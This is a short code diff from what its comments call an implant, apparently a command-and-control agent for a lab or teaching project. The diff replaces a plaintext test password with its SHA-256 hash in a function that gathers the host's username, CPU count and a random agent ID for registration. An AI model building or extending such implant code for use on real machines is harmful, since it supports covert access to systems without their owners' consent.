@@ -28,7 +28,7 @@ def init_data():
     whoami = os.getlogin()
     cpus = os.cpu_count()
     agent_id = os.urandom(16).hex() # a random value that is unqiue to this implant
-    password = "ch0nky" # for testing purposes
+    password = "19c0bf4143f96e80000546386d48491c442b0e431166fa78a8505264b0bd1134" # hex value of sha256 "ch0nky"; for testing purposes
     return {"whoami": whoami, "agent_id": agent_id, "password": password, "cpus": cpus}
 
 def register():
